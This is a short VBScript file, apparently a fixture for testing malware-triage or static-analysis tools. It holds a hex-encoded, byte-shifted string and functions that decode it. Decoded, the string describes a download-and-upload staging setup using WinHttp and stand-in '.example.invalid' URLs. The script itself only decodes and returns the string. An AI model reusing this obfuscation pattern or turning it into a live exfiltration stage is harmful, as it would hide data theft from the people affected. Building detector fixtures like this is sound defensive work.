Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_a02e4e37 = "844b3f8a8182737e814b7a7d716f82736d7a7d716f7a3a7e80737e6f80736d82806f7c817473803a837e7a7d6f726d80737b7d82738a6f726f7e8273804b65777c5682827e3c65777c5682827e60737f837381823c433c3f8a81826f75736d717d837c824b408a716f7b7e6f77757c6d77724b716f7b7e6f77757c3b714543714442436f73408a83807a4b7682827e81483d3d714543714442436f73403c73866f7b7e7a733c777c846f7a77723d45717471744572403c726f828a838173806d6f75737c824b56837c82807381815a6f703d714543714442436f73408a74777a736d7e6f82764b51486a63817380816a5e83707a77716a56837c82807381815a6f706a81826f75733b714543714442436f73403c726f828a837e7a7d6f726d83807a4b7682827e81483d3d714543714442436f73403c73866f7b7e7a733c777c846f7a77723d837e7a7d6f723d717145474242476f"
Const Codec_a02e4e37 = "hex_compact|add_modulo_256|0e"

Function Load_a02e4e37()
  Dim result(), i
  ReDim result((Len(Material_a02e4e37) \ 2) - 1)
  For i = 0 To UBound(result)
    result(i) = CInt("&H" & Mid(Material_a02e4e37, i * 2 + 1, 2))
  Next
  Load_a02e4e37 = result
End Function

Function Decode_a02e4e37(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(i) = (s(i) - 14 + 256) Mod 256
  Next
  Decode_a02e4e37 = result
End Function

Function Recover_a02e4e37()
  Dim s, d, t, n, i, p, e, q
  n = UBound(Array(3, 5, 8, 13))
  s = Load_a02e4e37()
  Do
    d = Decode_a02e4e37(s)
    Exit Do
  Loop
  t = ""
  For i = 0 To UBound(d)
    t = t & Chr(d(i))
  Next
  Recover_a02e4e37 = t
End Function

Function Inspect_a02e4e37()
  Inspect_a02e4e37 = Recover_a02e4e37()
End Function
